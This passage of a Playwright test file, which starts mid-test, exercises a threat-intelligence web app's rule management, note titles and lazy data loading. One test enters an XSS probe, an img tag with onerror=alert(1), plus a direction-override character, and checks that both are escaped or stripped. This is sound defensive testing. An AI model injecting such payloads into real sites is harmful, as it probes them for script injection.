  await boxes.nth(0).check(); await boxes.nth(1).check();
  await expect(page.locator('#rbk')).toBeVisible(); await expect(page.locator('#rbk')).toContainText('2 selected');
  await expect(page.locator('form.rx')).toHaveCount(0);                    // ticking a box does not open the rule
  await expect(page.locator('.dt tbody tr.sel')).toHaveCount(2);
  // star both, then unstar both
  await page.click('[data-act=rbStar]');
  expect(await page.evaluate(() => [...UI.rpick].map(id => DB.rules.find(r => r.id === id).starred))).toEqual([true, true]);
  await expect(page.locator('[data-act=rbStar]')).toContainText('Unstar'); await page.click('[data-act=rbStar]');
  expect(await page.evaluate(() => [...UI.rpick].every(id => !DB.rules.find(r => r.id === id).starred))).toBe(true);
  // download: two rules make a zip, one rule its own file
  let dl = page.waitForEvent('download'); await page.click('[data-act=rbDl]'); expect((await dl).suggestedFilename()).toBe('osintrix-rules-2.zip');
  // select all shown (header box), then delete with undo
  await page.locator('[data-act=rPickAll]').check(); await expect(page.locator('#rbk')).toContainText(shown + ' selected');
  await page.locator('[data-act=rPickAll]').uncheck(); await expect(page.locator('#rbk')).toBeHidden();
  await boxes.nth(0).check();
  dl = page.waitForEvent('download'); await page.click('[data-act=rbDl]'); expect((await dl).suggestedFilename()).toMatch(/\.ya?ml$|\.yar$/);
  await boxes.nth(1).check();
  const n0 = await page.evaluate(() => DB.rules.length), ids = await page.evaluate(() => [...UI.rpick]);
  await page.click('[data-act=rbDel]'); await page.click('[data-act=confirmOk]');
  expect(await page.evaluate(i => [DB.rules.length, i.some(id => DB.rules.some(r => r.id === id))], ids)).toEqual([n0 - 2, false]);
  await expect(page.locator('#rbk')).toBeHidden();
  await page.click('#toastBtn'); expect(await page.evaluate(() => DB.rules.length)).toBe(n0);
  // gallery has the same boxes
  await page.evaluate(() => { DB.prefs.rlay = 'gallery'; renderMain(); });
  await page.locator('.gcard [data-act=rPick]').first().check(); await expect(page.locator('.gcard.picked')).toHaveCount(1); await expect(page.locator('#rbk')).toContainText('1 selected');
  await page.click('[data-act=rbClear]'); await expect(page.locator('#rbk')).toBeHidden();
  // a new rule: Discard changes is off until something is edited, then puts the saved rule back
  await page.evaluate(() => { DB.prefs.rlay = 'table'; UI.dq = ''; renderMain(); });
  await page.locator('.page [data-act=rNew]').first().click(); await page.click('.ctx-it:has-text("Sigma")');
  const disc = page.locator('form.rx [data-act=rRevert]');
  await expect(disc).toHaveText('Discard changes'); await expect(disc).toBeDisabled();
  const t0 = await page.inputValue('#rTitle');
  await page.fill('#rTitle', 'Changed title'); await expect(disc).toBeEnabled(); await expect(page.locator('form.rx')).toHaveClass(/dirty/);
  await disc.click();
  await expect(page.locator('#rTitle')).toHaveValue(t0); await expect(page.locator('form.rx [data-act=rRevert]')).toBeDisabled();
  await expect(page.locator('#toast')).toContainText('Unsaved changes discarded');
  noErrors(errors);
});

test('a rule title that is already taken is flagged right under the title, as you type', async ({ page }) => {
  const errors = await open(page, '#/detections');
  await page.locator('.page [data-act=rNew]').first().click(); await page.click('.ctx-it:has-text("YARA")');
  await expect(page.locator('#rTitleWarn')).toBeHidden();
  const other = await page.evaluate(() => DB.rules[1].title);
  await page.fill('#rTitle', other.toUpperCase());
  await expect(page.locator('#rTitleWarn')).toBeVisible(); await expect(page.locator('#rTitleWarn')).toContainText('already exists');
  const box = await page.locator('#rTitleWarn').boundingBox(), tb = await page.locator('#rTitle').boundingBox();
  expect(box.y - (tb.y + tb.height)).toBeLessThan(20);                               // next to the title, not at the bottom of the panel
  await page.keyboard.press('Control+s'); await expect(page.locator('#rTitleWarn')).toBeVisible();
  expect(await page.evaluate(t => DB.rules.filter(r => r.title.toLowerCase() === t.toLowerCase()).length, other)).toBe(1);
  await page.fill('#rTitle', 'A unique title here'); await expect(page.locator('#rTitleWarn')).toBeHidden();
  noErrors(errors);
});


test('note titles: optional, shown on the card, cleaned, escaped, duplicate warned, carried by duplicate, search and Today', async ({ page }) => {
  const errors = await open(page, '#/notes');
  await page.evaluate(() => { UI.nf = 'general'; renderMain(); });
  // a title with hidden and direction characters and markup; a body as before
  await page.fill('.nquick [data-nq=title]', '  Weekly ‮catch-up  <img src=x onerror=alert(1)> ');
  await page.fill('.nquick textarea', '[ ] Call the client');
  await page.click('.nquick [type=submit]');
  const card = page.locator('.note-card:has-text("Call the client")');
  await expect(card.locator('.ntitle')).toHaveText('Weekly catch-up <img src=x onerror=alert(1)>');
  await expect(card.locator('img')).toHaveCount(0); await expect(card.locator('.ntask')).toHaveCount(1);
  expect(await page.evaluate(() => DB.notes[0].title)).toBe('Weekly catch-up <img src=x onerror=alert(1)>');
  // a title alone is a note; too long is refused
  await page.fill('.nquick [data-nq=title]', 'x'.repeat(121)); await page.click('.nquick [type=submit]');
  await expect(page.locator('.nquick .ferr')).toContainText('up to 120 characters');
  await page.fill('.nquick [data-nq=title]', 'Just a title'); await page.click('.nquick [type=submit]');
  await expect(page.locator('.note-card .ntitle:text-is("Just a title")')).toHaveCount(1);
  // the same title again in General: warned once, kept on the second press
  const n0 = await page.evaluate(() => DB.notes.length);
  await page.fill('.nquick [data-nq=title]', 'just   A TITLE'); await page.click('.nquick [type=submit]');
  await expect(page.locator('.nquick .ferr')).toContainText('already a note called'); expect(await page.evaluate(() => DB.notes.length)).toBe(n0);
  await page.click('.nquick [type=submit]'); expect(await page.evaluate(() => DB.notes.length)).toBe(n0 + 1);
  // the same title in a case is fine
  expect(await page.evaluate(() => !!noteTitleTwin('Just a title', 'c-lantern'))).toBe(false);
  // edit an existing note: add a title to it
  await page.click('[data-act=nf][data-v=all]');
  await page.locator('.note-card:has-text("Beacon interval") [data-act=nEdit]').click();
  await page.fill('#nTitle', 'Beacon timing'); await page.click('#dlg [type=submit]');
  await expect(page.locator('.note-card:has-text("Beacon interval") .ntitle')).toHaveText('Beacon timing');
  // clearing the body but keeping the title is allowed; clearing both is not
  await page.locator('.note-card:has-text("Beacon timing") [data-act=nEdit]').click();
  await page.fill('#nText', ''); await page.fill('#nTitle', ''); await page.click('#dlg [type=submit]');
  await expect(page.locator('#dlg .ferr')).toContainText('cannot be empty'); await page.click('#dlg [data-act=dclose]');
  // duplicate copies the title as "(copy)"
  await page.locator('.note-card:has-text("Beacon timing") [data-act=nMenu]').click(); await page.click('.ctx-it:has-text("Duplicate")');
  await expect(page.locator('.note-card .ntitle:text-is("Beacon timing (copy)")')).toHaveCount(1);
  // the notes search and global search find it by title; Today names a due note by its title
  await page.fill('#nqs', 'beacon timing'); await page.keyboard.press('Enter');
  await expect(page.locator('.note-card .ntitle')).toContainText(['Beacon timing']);
  expect(await page.evaluate(() => { const n = DB.notes.find(x => x.title === 'Beacon timing'); n.due = new Date().toISOString().slice(0, 10); return todayItems().items.some(i => i.t.includes('Due today: Beacon timing')); })).toBe(true);
  // a bad title from a backup or import is tidied when shown
  expect(await page.evaluate(() => [noteTitle({ title: 5 }), noteTitle({ title: '  a\u0000b‏c ' }), noteLabel({ title: '', text: '# Head line\nbody' })])).toEqual(['', 'abc', 'Head line']);
  noErrors(errors);
});

test('fast start: every script is fetched in parallel, the big data files arrive after the first screen and fill it in', async ({ page }) => {
  // the security policy tag stops the browser looking ahead, so each script must be listed as a preload
  const html = require('fs').readFileSync(require('path').resolve(__dirname, '..', 'index.html'), 'utf8');
  const scripts = [...html.matchAll(/<script src="([^"]+)"><\/script>/g)].map(m => m[1]), pre = new Set([...html.matchAll(/<link rel="preload" as="script" href="([^"]+)">/g)].map(m => m[1]));
  expect(scripts.length).toBeGreaterThan(50); for (const s of scripts) expect(pre.has(s), s + ' is preloaded with the same address').toBe(true);
  for (const m of html.matchAll(/(?:src|href)="((?:js|css)\/[^"]+)"/g)) expect(m[1], 'fingerprinted').toMatch(/\?v=\d+\.\d+-[0-9a-f]{8}$/);
  // hold the big files back: the app starts without them
  const held = /(detections-pack|cytoscape\.min|kev-snapshot|playbooks-pack)\.js/; let release; const gate = new Promise(r => release = r);
  await page.route(held, async route => { await gate; await route.continue(); });
  const errors = [], fetched = []; page.on('request', r => fetched.push(r.url()));
  page.on('pageerror', e => errors.push(e.message)); page.on('console', m => { if (m.type() === 'error' && !/localStorage.*sandboxed/.test(m.text())) errors.push(m.text()); });
  await page.goto('file://' + require('path').resolve(__dirname, '..', 'index.html') + '#/detections');
  await expect.poll(() => page.evaluate(() => !!document.querySelector('#sidenav .nv'))).toBe(true);
  await expect(page.locator('.ph .sub, .lib-h .sub, .page').first()).toContainText('loading the built-in rules');
  const before = await page.evaluate(() => [DB.rules.length, lzHas('rules'), lzHas('cy'), typeof cytoscape]);
  expect(before[1]).toBe(false); expect(before[2]).toBe(false);
  // a case graph opened before the library arrives draws once it does
  await page.evaluate(() => go(caseHash('c-lantern', 'graph')));
  release();
  await expect.poll(() => page.evaluate(() => lazyPending())).toBe(0);
  await expect(page.locator('#cy canvas').first()).toBeVisible();
  await page.evaluate(() => go('#/detections'));
  const after = await page.evaluate(() => DB.rules.length); expect(after).toBeGreaterThan(before[0] + 200);
  await expect(page.locator('.page').first()).not.toContainText('loading the built-in rules');
  expect(await page.evaluate(() => new Set(DB.rules.map(r => r.id)).size === DB.rules.length && new Set(DB.playbooks.map(p => p.id)).size === DB.playbooks.length)).toBe(true);   // nothing merged twice
  expect(await page.evaluate(() => CTI.kevMeta.n)).toBeGreaterThan(1000);
  // tools-only files are not fetched until the tool needs them
  expect(fetched.filter(u => /oui-vendors|world-map|enrich-data|jsqr/.test(u))).toEqual([]);
  expect(await page.evaluate(async () => { await ouiLoad(); return lzHas('oui'); })).toBe(true);
  expect(fetched.some(u => /oui-vendors/.test(u))).toBe(true);
  expect(errors).toEqual([]);
});
